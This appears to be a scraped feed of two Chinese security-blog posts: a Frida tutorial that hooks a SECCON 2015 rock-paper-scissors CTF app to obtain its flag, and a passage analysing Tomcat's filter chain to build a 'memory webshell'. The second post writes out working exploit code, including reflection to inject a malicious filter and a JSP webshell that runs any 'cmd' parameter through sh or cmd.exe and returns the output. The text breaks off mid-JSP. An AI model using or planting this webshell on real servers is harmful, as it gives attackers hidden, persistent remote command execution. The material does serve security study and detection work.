&lt;p&gt;东西准备的不算多，adb用夜神模拟器自带的就可以，别的就不多赘述了，别的博主那里已经写的非常清楚了，唯一要关注一点的是在新版夜神模拟器默认的端口是62025，adb只有连这个端口才能上的去，和网上说的有些差异。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Frida%E5%88%9D%E4%BD%93%E9%AA%8C/Pasted%20image%2020230821194526.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;对安卓的基本认识&lt;/h3&gt;
&lt;h4&gt;文件层面&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Class
和我们平常理解的字节码运行机制不一样，在Android平台上，&lt;code&gt;.class&lt;/code&gt;文件不能直接在Android设备上运行，因为Android使用了自己的运行时环境（最初是Dalvik虚拟机，后来转为ART），而不是标准的Java虚拟机（JVM）。在Android开发过程中，Java源代码会被编译成&lt;code&gt;.class&lt;/code&gt;文件，然后再通过工具将这些&lt;code&gt;.class&lt;/code&gt;文件转换成Dalvik可执行的&lt;code&gt;.dex&lt;/code&gt;（Dalvik Executable）文件。&lt;code&gt;.dex&lt;/code&gt;文件包含了Dalvik虚拟机可以理解和执行的指令集。&lt;/li&gt;
&lt;li&gt;Dex
dex文件是Android平台上的可执行文件。在编译Java代码之后，通过Android平台上的工具可以将Java字节码转换成Dex字节码。&lt;/li&gt;
&lt;li&gt;Apk
apk文件是Android上的安装文件。一个Android安装包包含了与某个Android应用程序相关的所有文件。apk文件将AndroidManifest.xml文件、应用程序代码(.dex文件)、资源文件和其他文件打成一个压缩包。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;三者关系大致如以下表格所示。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件类型&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;APK&lt;/td&gt;
&lt;td&gt;Android 应用程序包（Android Package），包含了应用的所有组件和资源文件，是安装和分发应用的主要格式,APK的组成如下所示。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;核心的字节码文件（Dex 文件）：存储了应用的字节码指令，以供 Android 设备的 Dalvik 或 ART 虚拟机执行。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;资源文件：包括应用所需的图片、布局、字符串等资源文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;清单文件（Manifest 文件）：描述了应用的组件、权限要求等信息。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;签名文件：APK 文件经过数字签名，用于验证应用的来源和完整性。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;Java 字节码文件，生成自 Java 源代码编译后的结果。Class 文件包含了应用程序的类、方法、字段等信息。在 Android 开发中，这些 Class 文件会被转换成 Dex 文件后才能在 Dalvik 或 ART 虚拟机上执行。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dex&lt;/td&gt;
&lt;td&gt;Dex（Dalvik Executable）文件是 Android 平台上特定的字节码文件格式，用于在 Dalvik 或 ART 虚拟机上执行。Dex 文件是为了优化在 Android 设备上的内存和执行效率而设计的。它将来自多个 Class 文件的字节码合并到一个文件中，并采用一些优化技术，例如压缩和跨方法优化。应用的所有 Class 文件经过转换，最终会生成一个 Dex 文件，该文件包含了应用的所有字节码指令。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;抽象层次介绍&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Java层 :  由Android 应用程序的主要开发层，包含了应用程序的各种功能和组件的实现逻辑。以下是 Java 层中常见的组件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Activity层 : 负责管理应用程序中的一个界面或一个屏幕，处理用户的输入、事件响应和生命周期管理等。【这个用的可多了】&lt;/li&gt;
&lt;li&gt;Service层 :  在后台执行长时间运行的操作，没有用户界面，用于处理一些独立于界面的任务，如播放音乐、下载文件等。&lt;/li&gt;
&lt;li&gt;BroadcastReceiver层：用于接收系统或其他应用程序发送的广播消息，可以在应用程序之间传递信息。&lt;/li&gt;
&lt;li&gt;ContentProvider层：用于管理应用程序的数据共享，允许其他应用程序访问数据，如联系人、媒体文件等。&lt;/li&gt;
&lt;li&gt;Fragment（片段）：可以看作是 Activity 的一部分，用于构建灵活的用户界面，可以独立管理自己的生命周期和事件。&lt;/li&gt;
&lt;li&gt;Intent（意图）：用于在不同组件之间进行通信和传递数据，如启动另一个 Activity 或发送广播等。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Native层: 也被称为 C/C++ 层，用于编写性能敏感的组件。在 Native 层，开发人员可以使用 C/C+和相关的库来实现一些底层功能。常见的 Native 层库包括 OpenGL ES（图形渲染）、OpenSL ES（音频处理）等。Native 层的代码通常会编译成库文件，&lt;a href=&quot;http://xn--onq.so&quot;&gt;以.so&lt;/a&gt;（共享对象）文件的形式存在 ( Native层和Java层的交互依赖so来实现 )&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux 内核层： Linux 内核层是 Android 操作系统的基础，Android 是基于 Linux 内核开发的。Linux 内核层负责管理硬件设备、提供系统服务和驱动等功能。它包括了设备驱动程序、文件系统、内存管理、进程管理、网络协议栈等。Linux 内核层提供了 Android 平台上的基本功能，允许应用程序通过系统服务和底层接口与硬件进行交互。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Frida使用&lt;/h3&gt;
&lt;h4&gt;基本命令&lt;/h4&gt;
&lt;p&gt;模拟器端 (启动frida-server)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. adb connect 127.0.0.1:62025
2. adb root
3. adb shell
4. cd /data/local/tmp
5. ./fs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;模拟器端(查看进程包名)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.adb shell
2.ps -elf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;frida-client&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.frida -U -f 包名 -l 要执行的js脚本 //未启动的app
2.frida -U 包名 - l 要执行的js脚本   //已启动的app
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Hook模板&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;目标函数替换&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Java.perform(function() {
    var TargetClass = Java.use(&apos;目标className&apos;);
    TargetClass.目标methodName.implementation = function() {
        console.log(&apos;targetMethod is hooked&apos;);
    };
});
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;实战案例&lt;/h4&gt;
&lt;p&gt;分享一道简单题吧，2015年的一道猜拳的CTF题，这里通过jadx反编译得到以下源码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package com.example.seccon2015.rock_paper_scissors;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import java.util.Random;

public class MainActivity extends Activity implements View.OnClickListener {
    Button P;
    Button S;
    int flag;
    int m;
    int n;
    Button r;
    int cnt = 0;
    private final Handler handler = new Handler();
    private final Runnable showMessageTask = new Runnable() { 
        public void run() {
            TextView tv3 = (TextView) MainActivity.this.findViewById(R.id.textView3);
            if (MainActivity.this.n - MainActivity.this.m == 1) {
                MainActivity.this.cnt++;
                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));
            } else if (MainActivity.this.m - MainActivity.this.n == 1) {
                MainActivity.this.cnt = 0;
                tv3.setText(&quot;LOSE +0&quot;);
            } else if (MainActivity.this.m == MainActivity.this.n) {
                tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));
            } else if (MainActivity.this.m &amp;lt; MainActivity.this.n) { 
                MainActivity.this.cnt = 0;  
                tv3.setText(&quot;LOSE +0&quot;);
            } else {
                MainActivity.this.cnt++;
                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));
            }
            if (1000 == MainActivity.this.cnt) {
                tv3.setText(&quot;SECCON{&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;}&quot;);
            }
            MainActivity.this.flag = 0;
        }
    };
    public native int calc();
    static {
        System.loadLibrary(&quot;calc&quot;);
    }
    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.P = (Button) findViewById(R.id.button);
        this.S = (Button) findViewById(R.id.button3);
        this.r = (Button) findViewById(R.id.buttonR);
        this.P.setOnClickListener(this);
        this.r.setOnClickListener(this);
        this.S.setOnClickListener(this);
        this.flag = 0;
    }
    @Override // android.view.View.OnClickListener
    public void onClick(View v) {
        if (this.flag != 1) {
            this.flag = 1;
            TextView tv3 = (TextView) findViewById(R.id.textView3);
            tv3.setText(&quot;&quot;);
            TextView tv = (TextView) findViewById(R.id.textView);
            TextView tv2 = (TextView) findViewById(R.id.textView2);
            this.m = 0;
            Random rm = new Random();
            this.n = rm.nextInt(3);
            String[] ss = {&quot;CPU: Paper&quot;, &quot;CPU: Rock&quot;, &quot;CPU: Scissors&quot;};
            tv2.setText(ss[this.n]);
            if (v == this.P) {
                tv.setText(&quot;YOU: Paper&quot;);
                this.m = 0;
            }
            if (v == this.r) {
                tv.setText(&quot;YOU: Rock&quot;);
                this.m = 1;
            }
            if (v == this.S) {
                tv.setText(&quot;YOU: Scissors&quot;);
                this.m = 2;
            }
            this.handler.postDelayed(this.showMessageTask, 1000L);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;虽然从来没学过安卓，但是因为咱们学过英语，所以大体还是能够猜出来代码的意思的，需要我们猜赢1000次才能拿到flag，中间连平局都不能有。因为这里的关键逻辑在onClick这里，我们直接hook它就行，但在hook之前还需要我们查出来包名，虽然这里用jadx直接能看到，但还是演示下正常的做法。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell am monitor
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在shell下输完以上命令后，再到模拟器里面打开要测试的app就会自己包名就会自己出来哩&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Frida%E5%88%9D%E4%BD%93%E9%AA%8C/Pasted%20image%2020230821231948.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;考虑到实际情况下，直接代审查函数也挺麻烦的，这里演示一下如何通过frida来查找当前已经调用的函数，缩小代审范围，首先先准备好以下脚本当传家宝（要是会用objection也行，这里就当我没说就行）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Java.perform(function() {
  var packageName = &quot;com.example.seccon2015.rock_paper_scissors&quot;;
  Java.enumerateLoadedClasses({
    onMatch: function(className) {
      if (className.startsWith(packageName)) {
        var targetClass = Java.use(className);
        var methods = targetClass.class.getDeclaredMethods();
        console.log(&quot;Class: &quot; + className);
        for (var i = 0; i &amp;lt; methods.length; i++) {
          console.log(methods[i].toString());
        }
        console.log(&quot;-------------------------------------&quot;);
      }
    },
    onComplete: function() {}
  });
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不知道为什么，这个模拟器用spwan模式老是崩，这里就用attach模式来做演示吧，先用adb连上去查一下pid&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell
ps -elf|grep &quot;com.example.seccon2015.rock_paper_scissors&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里查出来是8590，接着直接运行frida，得到以下结果，可以看到已经通过内存漫游，找到了并打印了我们自定义的函数
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Frida%E5%88%9D%E4%BD%93%E9%AA%8C/Pasted%20image%2020230822004819.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;然后再附上我们这里用来hook &lt;code&gt;onClick()&lt;/code&gt;的脚本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Java.perform(function () {
	var MainActivity = Java.use(&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;);
	var onClick = MainActivity.onClick;
	onClick.implementation = function (v) {
		send(&apos;onClick&apos;);
		// Call the original onClick handler
		this.m.value = 0;
		this.n.value = 1;
		this.cnt.value = 999;
		console.log(&apos;Done:&apos; + JSON.stringify(this.cnt));
	};
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回结果如下，手快，多按了几下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Frida%E5%88%9D%E4%BD%93%E9%AA%8C/Pasted%20image%2020230822011318.png&quot; alt=&quot;&quot; /&gt;
得到flag
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Frida%E5%88%9D%E4%BD%93%E9%AA%8C/Pasted%20image%2020230822011354.png&quot; alt=&quot;&quot; /&gt;
参考链接
https://www.anquanke.com/post/id/197657#h3-6
&lt;a href=&quot;https://sleepydogyp.github.io/2021/06/17/Frida-Hook-Android-App-%E7%AC%94%E8%AE%B0/&quot;&gt;Frida Hook Android App 笔记 | clicker&apos;s blogs (sleepydogyp.github.io)&lt;/a&gt;&lt;/p&gt;
</content:encoded></item><item><title>Tomcat内存马:Filter型</title><link>https://f4miti0n.github.io/posts/filter%E5%9E%8B/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/filter%E5%9E%8B/</guid><pubDate>Sat, 19 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;环境搭建&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Tomcat源码导入&lt;/li&gt;
&lt;li&gt;Servlet项目创建&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;流程分析&lt;/h3&gt;
&lt;p&gt;结合前面说过的知识，我们大体探索了一下tomcat的执行流程，这里附上小图一张，我们将以&lt;code&gt;StandardWrapperValve&lt;/code&gt;这个阀门作为起点分析过滤器的执行流程。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/InvokeChains.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;要是有闲情雅致的话，当然也可以从第一个管道开始往后顺一下，这里光把断点标一下就跳过了，有兴趣的话可以自己分析。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230818171422.png&quot; alt=&quot;&quot; /&gt;
直接来到&lt;code&gt;StandardWrapperValve#line168&lt;/code&gt;处，从初始化FilterChain的位置开始往后分析。&lt;code&gt;request&lt;/code&gt;, &lt;code&gt;wrapper&lt;/code&gt;, &lt;code&gt;servlet&lt;/code&gt; ,能够看的出来我们这三个对象都被作为了参数进行初始化，跟进一下看看
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230818171609.png&quot; alt=&quot;&quot; /&gt;
前面的部分就省略掉了，起到的作用大体概况一下，就是从request把filterChain对象取出来供后面使用。真正的关键位置如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230818171955.png&quot; alt=&quot;&quot; /&gt;
可以看到这里从&lt;code&gt;StandardContext&lt;/code&gt;里面取出来了一个名为&lt;code&gt;filterMaps&lt;/code&gt;的数组（不要想为什么wrapper能够取出来Context这个东西，wrapper本来就是前面流程的最终产物），这里要着重介绍一下这个filterMap对象以及和它相关的两个小老弟。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;filterMaps ：&lt;code&gt;filterMaps&lt;/code&gt;中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的&lt;code&gt;&amp;lt;filter-mapping&amp;gt;&lt;/code&gt;标签
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819002058.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;li&gt;filterConfigs：其中filterConfigs包含了当前的上下文信息&lt;code&gt;StandardContext&lt;/code&gt;、以及&lt;code&gt;filterDef&lt;/code&gt;等信息，其&lt;code&gt;filter&lt;/code&gt;属性就是当前已定义好的过滤器对象集合。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819002354.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;li&gt;filterDefs：&lt;code&gt;filterDefs&lt;/code&gt;是一个HashMap，以键值对的形式存储&lt;code&gt;filterDef&lt;/code&gt;，&lt;code&gt;filterDef&lt;/code&gt;存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的&lt;code&gt;&amp;lt;filter&amp;gt;&lt;/code&gt;标签。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819002755.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;filterConfigs这里要着重注意一下，因为我们所真正定义的过滤器对象，就是存储在它的filter对象里面的，后续的一系列调用都与他息息相关。&lt;/p&gt;
&lt;p&gt;补完插叙接着再回到源码分析部分，从line85往后看，来到了两处遍历部分
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819003953.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819004103.png&quot; alt=&quot;&quot; /&gt;
没有什么特别的，总体来说就是通过从filterMap获得到的Servletname信息，到context中获取filterConfig对象，然后再把获取到的filterConfig对象添加到filterChain里面，这里之所以有两组遍历，主要还是根据requestPath和servletName来做的区分，根据实操来看，第二组遍历在这里是不执行实际作用的。在获取完filterChain之后，我们回到&lt;code&gt;StandardWrapperValve&lt;/code&gt; 中，继续执行到 &lt;code&gt;filterChain.doFilter()&lt;/code&gt;，跟进分析。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819005135.png&quot; alt=&quot;&quot; /&gt;
进来之后先判断一下当前的安全设置是否是开着的，如果不是则直接跳转到&lt;code&gt;internalDoFilter()&lt;/code&gt;，二跟！
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819005357.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819005412.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;进去之后就是一个遍历filters的操作(存的是刚才放的filterConfigs)
这里的第一个元素是我们的自定义过滤器，第二个是tomcat自带的放filterChain末尾的过滤器
在经过一番无伤大雅的逻辑判断之后，会调用我们的&lt;code&gt;filter.dofilter()&lt;/code&gt;执行过滤器内部的代码逻辑，我们跟进去看一下。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819010056.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819010148.png&quot; alt=&quot;&quot; /&gt;
filterDemo... 欢迎你
这里可以看到我们在自定义过滤器里面又调用了filterChain.doFilter，可以跟进看看会发生什么
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819010410.png&quot; alt=&quot;&quot; /&gt;
emmmm，通过pos+1的办法，开始往后调用filterChain中下一个设定好的filter，也就是我们的&lt;code&gt;wsfilter&lt;/code&gt;，我们多跳几步，看下wsfilter的dofilter之后的代码逻辑。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819010643.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;通过层层加码，最终把filters数组彻底遍历完了，在第三次调用chain.doFilter后，终于在chain.doFilter内部实现了对servlet的访问（就最后调用service那里），至此，整个拦截机制流程彻底走完，后面就是不断的出栈&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819011012.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819011029.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819011119.png&quot; alt=&quot;&quot; /&gt;
刚学javaweb的时候，还被这个类似于AOP的拦截机制困扰过一段时间。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819011550.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Exp编写&lt;/h3&gt;
&lt;p&gt;通过前文分析，我们可以发现重点在&lt;code&gt;filterConfigs&lt;/code&gt;这个数组上，所以我们exp的重心也要放在这个数组上面，相关问题如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819135639.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;经过种种分析，可得出以下构造思路&lt;br /&gt;
1、获取当前应用的ServletContext对象&lt;br /&gt;
2、通过ServletContext对象再获取filterConfigs&lt;br /&gt;
2、接着实现自定义想要注入的filter对象&lt;br /&gt;
4、然后为自定义对象的filter创建一个FilterDef&lt;br /&gt;
5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现&lt;/p&gt;
&lt;h4&gt;获取StandardContext对象&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819190759.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;稍微回顾一下StandardContext的调用层次结构。根据这个层次结构，我们得到以下代码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//获取ApplicationContextFacade类
ServletContext servletContext = request.getSession().getServletContext();
//反射获取ApplicationContextFacade类属性context为ApplicationContext类
Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
//反射获取ApplicationContext类属性context为StandardContext类
Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;恶意Filter创建&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import javax.servlet.*;  
import java.io.IOException;  
public class Shell_Filter implements Filter {
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter(&quot;cmd&quot;);
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
            chain.doFilter(request, response);
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;filterDef创建&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;//filter名称
String name = &quot;CommonFilter&quot;;  
FilterDef filterDef = new FilterDef();  
filterDef.setFilter(filter);  
filterDef.setFilterName(name);  
filterDef.setFilterClass(filter.getClass().getName());  
standardContext.addFilterDef(filterDef);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;封装filterConfig及filterDef到filterConfigs&lt;/h4&gt;
&lt;p&gt;也是稍微回顾下这里的层次结构，然后得出以下代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819191658.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819193033.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
filterConfigs.put(name, filterConfig);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Jsp完整exp&lt;/h4&gt;
&lt;p&gt;把上面那些组合起来也可以，但真要用的话用下面这个师傅写的更好一点&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%--
  User: Drunkbaby
  Date: 2022/8/27
  Time: 上午10:31
--%&amp;gt;
&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.util.Map&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.io.IOException&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.io.InputStream&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.util.Scanner&quot; %&amp;gt;

&amp;lt;%
    final String name = &quot;Drunkbaby&quot;;
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter(&quot;cmd&quot;) != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty(&quot;os.name&quot;);
                    if (osTyp != null &amp;amp;&amp;amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[] {&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)} : new String[] {&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner( in ).useDelimiter(&quot;\\a&quot;);
                    String output = s.hasNext() ? s.next() : &quot;&quot;;
                    servletResponse.getWriter().write(output);
                    servletResponse.getWriter().flush();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
            @Override
            public void destroy() {
            }
        };
        FilterDef filterDef = new FilterDef();
